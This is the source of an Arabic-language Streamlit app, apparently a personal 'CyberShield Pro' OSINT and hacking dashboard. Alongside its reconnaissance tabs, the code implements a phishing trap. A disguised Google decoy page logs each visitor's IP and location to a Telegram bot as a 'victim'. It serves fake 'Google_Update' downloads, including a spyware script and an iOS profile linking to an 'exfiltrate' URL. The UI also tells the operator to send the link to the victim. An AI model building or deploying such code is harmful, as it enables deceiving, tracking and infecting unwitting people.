import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# تحميل مفتاح TAVILY من Secrets إذا وجد
if "TAVILY_API_KEY" in st.secrets:
    os.environ["TAVILY_API_KEY"] = st.secrets["TAVILY_API_KEY"]

# استيراد الوحدات الخاصة بالأدوات (مع معالجة الخطأ إذا لم تكن موجودة)
try:
    import domain_osint
    import ai_pentest
    import port_scanner
    import network_mapper
    import google_dork
    import vuln_scanner
    import darkweb_search
    import ai_threat
    import email_osint
    import phone_osint
    import website_scan
    import username_osint
    import geoip_osint
    import attack_surface
    import ai_analysis
    import report_generator
    from ai_hacking import AIHackingAssistant
except ImportError as e:
    st.warning(f"بعض المكتبات مفقودة: {e}. سيتم تشغيل الأدوات الأساسية فقط.")

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")

# إخفاء واجهة Streamlit تماماً في وضع التمويه
hide_st_style = """
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            header {visibility: hidden;}
            .stApp [data-testid="stToolbar"] {display: none;}
            .stApp [data-testid="stDecoration"] {display: none;}
            .stApp [data-testid="stStatusWidget"] {display: none;}
            #manage-app-button {display: none !important;}
            [data-testid="stStatusWidget"] {display: none !important;}
            .st-emotion-cache-10trblm {display: none !important;}
            .st-emotion-cache-1dp5vir {display: none !important;}
            </style>
            """

# دالة جلب الـ IP العام من السيرفر
def get_server_side_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            return headers["X-Forwarded-For"].split(",")[0].strip()
        return "Unknown"
    except:
        return "Unknown"

# دالة إرسال التنبيه لتلجرام
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        return
        
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except:
        pass

    message = f"""
🎯 تنبيه: تم اكتشاف ضحية جديدة!

📍 عنوان IP: {ip}
🌍 الدولة: {geo_data['country']}
🏙️ المدينة: {geo_data['city']}
🏢 مزود الخدمة: {geo_data['isp']}
📱 الجهاز: {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except:
        pass

# التحقق من وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)
    client_ip = query_params.get("ip", get_server_side_ip())
    trap_name = query_params.get("trap", "Google Decoy")
    
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name)
        st.session_state.alert_sent = True

    with open("index.html", "r", encoding="utf-8") as f:
        html_content = f.read()
    st.components.v1.html(html_content, height=1000, scrolling=False)
    st.stop()

# معالجة طلبات التحميل المباشرة
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = query_params.get("ip", get_server_side_ip())
    send_telegram_alert(ip, f"Download ({device})", device)
    
    if device == "android":
        file_name = "Google_Update.apk"
        content = b"Fake APK Content for Google Update"
    elif device == "ios":
        file_name = "Google_Update.mobileconfig"
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
    else:
        file_name = "Google_Update.py"
        if os.path.exists("spy_full.py"):
            with open("spy_full.py", "r") as f:
                content = f.read().encode('utf-8')
        else:
            content = b"print('Google Update Service Started...')"
            
    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream")
    st.stop()

# --- الواجهة الرئيسية للمطور ---
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🛡️ تسجيل الدخول - Rashd_Ai")
    with st.form("login_form"):
        user = st.text_input("اسم المستخدم")
        pw = st.text_input("كلمة المرور", type="password")
        if st.form_submit_button("دخول"):
            if user == "Rashd919" and pw == "112233":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("بيانات خاطئة")
    st.stop()

st.title("🛡 منصة CyberShield Pro للذكاء الاستخباراتي و OSINT")

with st.sidebar:
    st.header("⚙️ الإعدادات")
    telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
    telegram_chat_id = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
    if st.button("حفظ إعدادات تلجرام"):
        config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
        config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
        st.success("تم الحفظ بنجاح!")
    
    if st.button("تسجيل الخروج"):
        st.session_state.authenticated = False
        st.rerun()

# التبويبات الـ 18 المطلوبة مع دمج الكود القديم
tab_names = [
    "💬 المحادثة", "🌐 تحليل الدومين", "🔍 فحص المواقع", "👤 بحث عن المستخدم", "📍 تحديد الموقع", 
    "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 Google Dork", 
    "📧 Email OSINT", "📱 Phone Lookup", "🌑 Dark Web", "🔌 Port Scanner", 
    "⚠️ Vulnerability Scanner", "🗺 Network Mapper", "🤖 AI Threat Analysis", "💡 AI Pentest Advisor", "📄 التقارير",
    "🎯 المصيدة"
]
tabs = st.tabs(tab_names)

# 0. المحادثة
with tabs[0]:
    st.header("💬 مساعد Rashd_Ai الذكي")
    if "messages" not in st.session_state:
        st.session_state.messages = []
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        with st.chat_message("assistant"):
            response = f"أنا مساعدك الذكي Rashd_Ai. لقد استلمت رسالتك: '{prompt}'."
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

# 1. تحليل الدومين
with tabs[1]:
    domain = st.text_input("أدخل اسم الدومين", key="domain_input")
    if st.button("تحليل الدومين", key="domain_btn"):
        try:
            whois = domain_osint.whois_lookup(domain)
            dns = domain_osint.dns_lookup(domain)
            subs = domain_osint.subdomain_scan(domain)
            st.write("WHOIS", whois)
            st.write("DNS", dns)
            st.write("النطاقات الفرعية المكتشفة", subs)
            st.session_state["domain"] = domain
            st.session_state["subs"] = subs
        except NameError:
            st.error("أداة تحليل الدومين غير متوفرة حالياً.")

# 2. فحص المواقع
with tabs[2]:
    url = st.text_input("أدخل رابط الموقع", key="site_input")
    if st.button("فحص الموقع", key="site_btn"):
        try:
            tech = website_scan.detect_tech(url)
            headers = website_scan.header_analysis(url)
            emails = website_scan.extract_emails(url)
            st.write("التقنيات المكتشفة", tech)
            st.write("الهيدرز", headers)
            st.write("الإيميلات المكتشفة", emails)
            st.session_state["scan"] = {"tech": tech, "headers": headers, "emails": emails}
        except NameError:
            st.error("أداة فحص المواقع غير متوفرة حالياً.")

# 3. بحث عن المستخدم
with tabs[3]:
    username = st.text_input("أدخل اسم المستخدم", key="username_input")
    if st.button("بحث عن المستخدم", key="username_btn"):
        try:
            result = username_osint.username_search(username)
            if isinstance(result, dict) and result:
                st.success("تم العثور على الحسابات التالية:")
                for platform, link in result.items():
                    st.write(f"✅ {platform} : {link}")
            else:
                st.warning("لم يتم العثور على حسابات بهذا الاسم")
        except NameError:
            st.error("أداة بحث المستخدم غير متوفرة حالياً.")

# 4. تحديد الموقع الجغرافي
with tabs[4]:
    ip_input = st.text_input("أدخل IP", key="geoip_input")
    if st.button("تحديد الموقع", key="geoip_btn"):
        try:
            data = geoip_osint.geoip(ip_input)
            st.write(data)
        except NameError:
            st.error("أداة تحديد الموقع غير متوفرة حالياً.")

# 5. سطح الهجوم
with tabs[5]:
    if "subs" in st.session_state:
        try:
            file = attack_surface.draw_graph(st.session_state["domain"], st.session_state["subs"])
            st.image(file)
        except NameError:
            st.error("أداة سطح الهجوم غير متوفرة حالياً.")
    else:
        st.warning("قم أولاً بفحص النطاقات الفرعية في تبويب تحليل الدومين.")

# 6. تحليل ذكي
with tabs[6]:
    if "subs" in st.session_state:
        try:
            analysis = ai_analysis.analyze_ports(
                st.session_state["domain"], list(st.session_state["subs"].values())
            )
            st.text(analysis)
        except NameError:
            st.error("أداة التحليل الذكي غير متوفرة حالياً.")
    else:
        st.warning("قم أولاً بفحص النطاقات الفرعية في تبويب تحليل الدومين.")

# 7. مساعد الهجوم
with tabs[7]:
    target = st.text_input("🎯 أدخل الدومين أو IP للتحليل", key="ai_target_input")
    open_ports_input = st.text_input("المنافذ المفتوحة (مثال: 22,80,443)", key="ai_ports_input")
    tech_input = st.text_input("التقنيات المكتشفة (مثال: WordPress, Django)", key="ai_tech_input")
    if st.button("تحليل الهدف بالذكاء الاصطناعي", key="ai_btn"):
        try:
            open_ports = [int(p.strip()) for p in open_ports_input.split(",") if p.strip().isdigit()]
            tech_list = [t.strip() for t in tech_input.split(",") if t.strip()]
            ai_hacking_assistant = AIHackingAssistant()
            analysis = ai_hacking_assistant.analyze_target(target, open_ports, tech_list, headers=None)
            st.code(analysis)
        except NameError:
            st.error("مساعد الهجوم الذكي غير متوفر حالياً.")

# 8. Google Dork
with tabs[8]:
    query = st.text_input("أدخل نص البحث للـ Google Dork", key="dork_input")
    if st.button("بحث Google Dork", key="dork_btn"):
        try:
            results = google_dork.search_dork(query)
            if isinstance(results, dict) and "error" in results:
                st.error(results["error"])
            else:
                for r in results:
                    st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
        except NameError:
            st.error("أداة Google Dork غير متوفرة حالياً.")

# 9. Email OSINT
with tabs[9]:
    email = st.text_input("أدخل البريد الإلكتروني للتحليل", key="email_input")
    if st.button("بحث البريد الإلكتروني", key="email_btn"):
        try:
            with st.spinner("جاري البحث عن تسريبات البريد..."):
                res = email_osint.email_search(email)
                if "error" in res:
                    st.error(res["error"])
                else:
                    if "Tavily_Analysis" in res:
                        st.success("تحليل Tavily:")
                        st.write(res["Tavily_Analysis"])
                    if "Search_Results" in res and res["Search_Results"]:
                        st.write("---")
                        st.write("النتائج المكتشفة:")
                        for r in res["Search_Results"]:
                            st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
        except NameError:
            st.error("أداة Email OSINT غير متوفرة حالياً.")

# 10. Phone Lookup
with tabs[10]:
    number = st.text_input("أدخل رقم الهاتف", key="phone_input")
    if st.button("بحث رقم الهاتف", key="phone_btn"):
        try:
            res = phone_osint.phone_lookup(number)
            if isinstance(res, dict) and "error" in res:
                st.error(res["error"])
            elif isinstance(res, dict) and "message" in res:
                st.info(res["message"])
            else:
                for r in res:
                    st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
        except NameError:
            st.error("أداة Phone Lookup غير متوفرة حالياً.")

# 11. Dark Web
with tabs[11]:
    query_dw = st.text_input("أدخل نص البحث في الشبكة المظلمة", key="darkweb_input")
    if st.button("بحث Dark Web", key="darkweb_btn"):
        try:
            res = darkweb_search.darkweb_lookup(query_dw)
            if isinstance(res, dict) and "error" in res:
                st.error(res["error"])
            elif isinstance(res, dict) and "message" in res:
                st.info(res["message"])
            else:
                for r in res:
                    st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
        except NameError:
            st.error("أداة Dark Web غير متوفرة حالياً.")

# 12. Port Scanner
with tabs[12]:
    target_port = st.text_input("أدخل IP أو الدومين للفحص", key="port_input")
    if st.button("فحص المنافذ", key="port_btn"):
        try:
            res = port_scanner.scan_ports(target_port)
            st.write(res)
        except NameError:
            st.error("أداة Port Scanner غير متوفرة حالياً.")

# 13. Vulnerability Scanner
with tabs[13]:
    target_vuln = st.text_input("أدخل IP أو الدومين للفحص", key="vuln_input")
    if st.button("فحص الثغرات", key="vuln_btn"):
        try:
            res = vuln_scanner.scan_vulnerabilities(target_vuln)
            if isinstance(res, dict) and "error" in res:
                st.error(res["error"])
            elif isinstance(res, dict) and "message" in res:
                st.info(res["message"])
            else:
                for vuln in res:
                    st.write(f"**{vuln['title']}** - [Link]({vuln['url']})<br>{vuln['snippet']}")
        except NameError:
            st.error("أداة Vulnerability Scanner غير متوفرة حالياً.")

# 14. Network Mapper
with tabs[14]:
    target_net = st.text_input("أدخل IP أو الدومين لرسم الشبكة", key="net_input")
    if st.button("رسم الشبكة", key="net_btn"):
        try:
            file = network_mapper.map_network(target_net)
            st.image(file)
        except NameError:
            st.error("أداة Network Mapper غير متوفرة حالياً.")

# 15. AI Threat Analysis
with tabs[15]:
    target_threat = st.text_input("أدخل الهدف لتحليل التهديدات", key="threat_input")
    if st.button("تحليل التهديد", key="threat_btn"):
        try:
            res = ai_threat.analyze_threat(target_threat)
            st.write(res)
        except NameError:
            st.error("أداة AI Threat Analysis غير متوفرة حالياً.")

# 16. AI Pentest Advisor
with tabs[16]:
    target_pentest = st.text_input("أدخل الهدف لاختبار الاختراق", key="pentest_target_input")
    open_ports_pentest = st.text_input("المنافذ المفتوحة (مثال: 22,80,443)", key="pentest_ports_input")
    tech_pentest = st.text_input("التقنيات المكتشفة (مثال: WordPress, Django)", key="pentest_tech_input")
    if st.button("اقتراح اختبار اختراق", key="pentest_btn"):
        try:
            open_ports = [int(p.strip()) for p in open_ports_pentest.split(",") if p.strip().isdigit()]
            tech_list = [t.strip() for t in tech_pentest.split(",") if t.strip()]
            res = ai_pentest.pentest_advice(target_pentest, open_ports, tech_list)
            st.write(res)
        except NameError:
            st.error("أداة AI Pentest Advisor غير متوفرة حالياً.")

# 17. التقارير
with tabs[17]:
    if st.button("إنشاء تقرير PDF", key="report_btn"):
        try:
            file = report_generator.create_report(st.session_state)
            with open(file, "rb") as f:
                st.download_button("تحميل التقرير", f, file_name=file, key="download_report")
        except NameError:
            st.error("أداة التقارير غير متوفرة حالياً.")

# 18. تبويب المصيدة
with tabs[18]:
    st.header("🎯 نظام المصيدة المتقدم")
    col1, col2 = st.columns(2)
    with col1:
        st.subheader("🔗 توليد الروابط")
        trap_name = st.text_input("اسم المصيدة", value="Google_Update")
        base_url = "https://rashdai.streamlit.app/"
        decoy_url = f"{base_url}?decoy=google&trap={trap_name}"
        st.code(decoy_url, language="text")
        st.info("انسخ الرابط أعلاه وأرسله للضحية.")
        
    with col2:
        st.subheader("📊 سجل الضحايا")
        victims = victim_logger.get_all_victims()
        if victims:
            st.table(victims)
        else:
            st.write("لا يوجد ضحايا مسجلين بعد.")

    st.subheader("📈 الإحصائيات")
    st.write(f"إجمالي الضحايا: {len(victims) if victims else 0}")
